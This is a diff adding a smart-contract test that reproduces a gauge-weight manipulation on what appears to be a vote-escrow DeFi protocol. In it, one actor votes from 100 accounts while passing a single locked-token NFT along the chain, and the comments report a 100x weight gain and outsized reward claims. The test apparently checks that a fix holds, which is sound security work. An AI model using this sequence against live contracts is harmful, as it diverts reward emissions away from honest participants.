@@ -573,3 +573,81 @@ def test_gc_total_supply_manip(ve_yb, yb, gc, accounts, admin, token_mock, use_f
     print(f"Final adjusted weights: gauge1={gc.adjusted_gauge_weight(gauge1.address)}, gauge2={gc.adjusted_gauge_weight(gauge2.address)}")
     print(f"Final adjusted weights sum: {gc.adjusted_gauge_weight_sum()}")
     print(f"Final emissions: gauge1={final_emissions1}, gauge2={final_emissions2}")
+
+
+def test_weight_manipulation(ve_yb, yb, gc, admin, collateral_token, stablecoin):
+    # Add new gauges to the GaugeController
+    with boa.env.prank(admin):
+        dummy_factory = boa.load('contracts/testing/DummyFactoryForGauge.vy', admin, gc.address)
+    with boa.env.prank(dummy_factory.address):
+        btc_gauge = boa.load('contracts/dao/LiquidityGauge.vy', collateral_token.address)
+        usdc_gauge = boa.load('contracts/dao/LiquidityGauge.vy', stablecoin.address)
+    with boa.env.prank(admin):
+        gc.add_gauge(btc_gauge.address)
+        gc.add_gauge(usdc_gauge.address)
+
+    # Regular user gets 1 YB token, locks them, and deposits 5 USDC (50% of supply)
+    REGULAR_USER = boa.env.generate_address()
+    with boa.env.prank(admin):
+        yb.mint(REGULAR_USER, 10 ** 18)
+    stablecoin._mint_for_testing(REGULAR_USER, 10 * 10 ** 18)
+
+    print("stablecoin total supply", stablecoin.totalSupply())
+
+    with boa.env.prank(REGULAR_USER):
+        yb.approve(ve_yb.address, 2 ** 256 - 1)
+        ve_yb.create_lock(10 ** 18, boa.env.evm.patch.timestamp + MAX_TIME)
+        ve_yb.infinite_lock_toggle()
+        stablecoin.approve(usdc_gauge.address, 2 ** 256 - 1)
+        usdc_gauge.deposit(5 * 10 ** 18, REGULAR_USER)
+        gc.vote_for_gauge_weights([usdc_gauge.address], [10000])
+
+    # Hacker creates N accounts
+    HACKER_ACCOUNTS_CNT = 100
+    HACKER_ACCOUNTS = [boa.env.generate_address() for _ in range(HACKER_ACCOUNTS_CNT)]
+
+    # Hacker distributes ~1 YB token between accounts and create locks for all of them
+    for i in range(HACKER_ACCOUNTS_CNT):
+        size = 10 ** 18 - (HACKER_ACCOUNTS_CNT - 1) if i == 0 else MAX_TIME
+        with boa.env.prank(admin):
+            yb.mint(HACKER_ACCOUNTS[i], size)
+        with boa.env.prank(HACKER_ACCOUNTS[i]):
+            yb.approve(ve_yb.address, 2 ** 256 - 1)
+            ve_yb.create_lock(size, boa.env.evm.patch.timestamp + MAX_TIME)
+            ve_yb.infinite_lock_toggle()
+
+    # Hacker deposits 5 BTC (50% of supply)
+    collateral_token._mint_for_testing(HACKER_ACCOUNTS[0], 10 * 10 ** 18)
+
+    print("collateral token total supply", collateral_token.totalSupply())
+
+    with boa.env.prank(HACKER_ACCOUNTS[0]):
+        collateral_token.approve(btc_gauge.address, 2 ** 256 - 1)
+        btc_gauge.deposit(5 * 10 ** 18, HACKER_ACCOUNTS[0])
+
+    # Voting for the gauge from all hacker accounts, transferring locked tokens
+    for i in range(HACKER_ACCOUNTS_CNT):
+        with boa.env.prank(HACKER_ACCOUNTS[i]):
+            gc.vote_for_gauge_weights([btc_gauge.address], [0])
+            if i < HACKER_ACCOUNTS_CNT - 1:
+                ve_yb.transferFrom(HACKER_ACCOUNTS[i], HACKER_ACCOUNTS[i + 1], ve_yb.tokenOfOwnerByIndex(HACKER_ACCOUNTS[i], 0))
+
+    # Hacked gauge gets 100x more weight
+    btc_gauge_weight = gc.get_gauge_weight(btc_gauge.address)    # 100000000000000004950
+    usdc_gauge_weight = gc.get_gauge_weight(usdc_gauge.address)  # 1000000000000000000
+
+    print("btc_gauge_weight", btc_gauge_weight)
+    print("usdc_gauge_weight", usdc_gauge_weight)
+
+    boa.env.time_travel(4 * WEEK)
+
+    with boa.env.prank(HACKER_ACCOUNTS[0]):
+        claimed_by_hacker = btc_gauge.claim()    # 13336055934441218818416799
+    with boa.env.prank(REGULAR_USER):
+        claimed_by_regular = usdc_gauge.claim()  # 133360559344412181583157
+
+    print("claimed_by_hacker", claimed_by_hacker)
+    print("claimed_by_regular", claimed_by_regular)
+
+    assert claimed_by_regular > 0
+    assert claimed_by_hacker == 0
